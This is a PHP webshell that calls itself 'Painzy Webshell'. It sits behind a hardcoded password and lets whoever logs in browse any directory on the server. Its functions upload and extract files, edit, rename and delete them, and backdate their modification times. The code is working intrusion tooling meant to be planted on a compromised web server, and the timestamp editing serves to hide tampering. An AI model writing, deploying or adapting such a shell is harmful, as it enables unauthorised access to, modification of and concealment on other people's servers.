<?php
session_start();

// password yg valid
$valid_pass = 'pain';

if (isset($_POST['pass'])) {
    if ($_POST['pass'] === $valid_pass) {
        $_SESSION['login'] = true;
        session_regenerate_id(true);
    } else {
        $error = "Password salah!";
    }
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
?>
<!DOCTYPE html>
<html>
<head>
  <title>Login | Painzy File Manager</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');

    body {
      font-family: 'Fira Code', monospace;
      background: #000;
      color: #00ff88;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .terminal {
      background: rgba(0,0,0,0.9);
      border: 2px solid #00ff88;
      padding: 30px;
      border-radius: 6px;
      width: 400px;
      box-shadow: 0 0 20px #00ff88;
      text-align: center;
    }

    .terminal h2 {
      margin-bottom: 20px;
      color: #0f0;
      text-shadow: 0 0 10px #00ff88;
      font-size: 18px;
    }

    input[type=password] {
      background: #000;
      border: 1px solid #00ff88;
      color: #00ff88;
      padding: 12px;
      width: 100%;
      margin-bottom: 15px;
      font-size: 14px;
      border-radius: 4px;
      transition: 0.2s;
    }
    input[type=password]:focus {
      outline: none;
      box-shadow: 0 0 10px #00ff88;
    }

    input[type=submit] {
      background: #00ff88;
      border: none;
      color: #000;
      padding: 12px;
      width: 100%;
      font-weight: bold;
      cursor: pointer;
      border-radius: 4px;
      transition: 0.2s;
    }
    input[type=submit]:hover {
      background: #0f0;
      box-shadow: 0 0 15px #00ff88;
    }

    .error {
      color: red;
      margin-bottom: 10px;
      font-weight: bold;
      text-shadow: 0 0 5px red;
    }

    #typing {
      margin-bottom: 20px;
      min-height: 20px;
      color: #00ffcc;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="terminal">
    <h2>Painzy File Manager :: Login</h2>
    <div id="typing"></div>
    <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
    <form method="post">
      <input type="password" name="pass" placeholder="Enter Password..." required>
      <input type="submit" value="Access">
    </form>
  </div>

  <script>
    const text = "Please enter the access password";
    let i = 0;
    function typing() {
      if (i < text.length) {
        document.getElementById("typing").innerHTML += text.charAt(i);
        i++;
        setTimeout(typing, 60);
      }
    }
    typing();
  </script>
</body>
</html>
<?php
exit;
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();

function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if (strpos($target, $path) === 0 && is_writable($target)) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) rmdir($target);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($path . '/' . $_POST['rename_from']);
    $to = $path . '/' . basename($_POST['rename_to']);
    if (strpos($from, $path) === 0 && file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['edit_date_file'], $_POST['new_date'])) {
    $target = realpath($path . '/' . $_POST['edit_date_file']);
    if (strpos($target, $path) === 0 && file_exists($target)) {
        $timestamp = strtotime($_POST['new_date']);
        if ($timestamp !== false) {
            touch($target, $timestamp);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['new_folder'])) {
    mkdir($path . '/' . basename($_POST['new_folder']));
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['new_file'])) {
    file_put_contents($path . '/' . basename($_POST['new_file']), '');
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . basename($_FILES['upload']['name']));
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (!empty($_FILES['uploads'])) {
    foreach ($_FILES['uploads']['name'] as $i => $name) {
        if ($_FILES['uploads']['error'][$i] === UPLOAD_ERR_OK) {
            $tmp = $_FILES['uploads']['tmp_name'][$i];
            $dest = $path . '/' . basename($name);
            move_uploaded_file($tmp, $dest);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (!empty($_FILES['zipfile']['name'])) {
    $zipName = $_FILES['zipfile']['name'];
    $tmpZip  = $_FILES['zipfile']['tmp_name'];
    $destZip = $path . '/' . basename($zipName);

    if (move_uploaded_file($tmpZip, $destZip)) {
        $zip = new ZipArchive;
        if ($zip->open($destZip) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            unlink($destZip); 
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['save_file'], $_POST['content'])) {
    $file = realpath($path . '/' . $_POST['save_file']);
    if (strpos($file, $path) === 0 && is_file($file)) {
        file_put_contents($file, $_POST['content']);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

$home_shell_path = realpath(dirname(__FILE__));
?>
<!DOCTYPE html>
<html>
<head>
  <title>Painzy File Manager</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');
    body { font-family: 'Fira Code', monospace; background: #000; color: #00ff88; padding: 20px; }
    a { color: #0ff; text-decoration: none; }
    a:hover { color: #fff; text-shadow: 0 0 10px #0ff; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; background: rgba(0,20,0,0.8); border: 1px solid #00ff88; box-shadow: 0 0 15px #00ff88; }
    th, td { padding: 10px; border: 1px solid #00ff88; text-align: left; }
    tr:hover { background: rgba(0,255,136,0.1); }
    input, button, select, textarea { background: #111; border: 1px solid #00ff88; color: #00ff88; padding: 6px; border-radius: 4px; font-family: 'Fira Code', monospace; }
    input:focus, textarea:focus { outline: none; box-shadow: 0 0 10px #00ff88; }
    button:hover, input[type="submit"]:hover { background: #00ff88; color: #000; cursor: pointer; }
    textarea { width: 100%; height: 400px; background: #000; color: #00ff88; border: 1px solid #00ff88; padding: 10px; font-size: 14px; }
    .top-bar { display: flex; justify-content: space-between; align-items: center; }
    .logo { font-size: 20px; font-weight: bold; color: #0f0; text-shadow: 0 0 10px #0f0, 0 0 20px #0ff; }
  </style>
</head>
<body>
  <div class="top-bar">
    <div class="logo">Painzy Webshell</div>
  </div>

  <div>
    <strong>Current Path:</strong>
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $build = '';
    echo '<a href="?path=' . urlencode($home_shell_path) . '">Home</a>';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $build .= '/' . $part;
        echo '/' . '<a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
    }
    ?>
  </div>

  <?php if ($path !== '/') echo "<a href='?path=" . urlencode(dirname($path)) . "'>⬆️ Up Dir</a>"; ?>

  <table>
    <tr><th>Name</th><th>Size</th><th>Perm</th><th>Date</th><th>Action</th></tr>
    <?php
    $items = scandir($path);
    $dirs = []; $files = [];
    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $full = $path . '/' . $f;
        if (is_dir($full)) $dirs[] = $f; else $files[] = $f;
    }
    $all = array_merge($dirs, $files);
    foreach ($all as $f):
        $full = $path . '/' . $f;
        $perm_num = substr(sprintf('%o', fileperms($full)), -4);
        $mtime = filemtime($full);
    ?>
    <tr>
      <td><?php echo is_dir($full) ? "[DIR] <a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($f) . "</a>" : "<a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "'>" . htmlspecialchars($f) . "</a>"; ?></td>
      <td><?php echo is_file($full) ? formatSize(filesize($full)) : '-'; ?></td>
      <td><?php echo $perm_num; ?></td>
      <td><?php echo date("Y-m-d H:i", $mtime); ?></td>
      <td>
        <form method="post" style="display:inline;">
          <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
          <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" style="width: 70px;">
          <button type="submit">r</button>
        </form> -
        <?php if (is_file($full)): ?>
          <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>">e</a> -
        <?php endif; ?>
        <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Delete?')">d</a>
      </td>
    </tr>
    <?php endforeach; ?>
  </table>

  <h3>Upload File</h3>
  <form method="post" enctype="multipart/form-data">
    <input type="file" name="upload"><input type="submit" value="Upload">
  </form>

  <h3>Upload Multiple Files</h3>
  <form method="post" enctype="multipart/form-data">
    <input type="file" name="uploads[]" multiple><input type="submit" value="Upload">
  </form>

  <h3>Upload & Extract ZIP</h3>
  <form method="post" enctype="multipart/form-data">
    <input type="file" name="zipfile" accept=".zip"><input type="submit" value="Upload & Extract">
  </form>

  <h3>Create Folder</h3>
  <form method="post">
    <input type="text" name="new_folder" placeholder="Folder Name"><input type="submit" value="Create">
  </form>

  <h3>Create Empty File</h3>
  <form method="post">
    <input type="text" name="new_file" placeholder="File.txt"><input type="submit" value="Create">
  </form>

  <?php
  if (isset($_GET['edit'])):
      $edit = realpath($path . '/' . $_GET['edit']);
      if (strpos($edit, $path) === 0 && is_file($edit)):
          $isi = htmlspecialchars(file_get_contents($edit));
  ?>
  <h3>Edit File: <?php echo basename($edit); ?></h3>
  <form method="post">
    <textarea name="content"><?php echo $isi; ?></textarea><br>
    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
    <input type="submit" value="Save">
    <a href="?path=<?php echo urlencode($path); ?>">⬅️ Back</a>
  </form>
  <?php endif; endif; ?>
</body>
</html>